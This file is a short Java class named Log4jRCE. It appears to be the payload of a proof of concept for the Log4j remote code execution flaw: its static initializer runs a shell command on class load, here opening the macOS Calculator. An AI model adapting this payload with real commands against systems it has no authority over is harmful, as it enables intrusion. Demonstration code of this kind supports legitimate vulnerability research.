public class Log4jRCE {
    static {
        try {
            String var0 = "open /System/Applications/Calculator.app";
            Runtime.getRuntime().exec(var0);
        } catch (Exception var1) {
            var1.printStackTrace();
        }
        System.out.println();
    }
}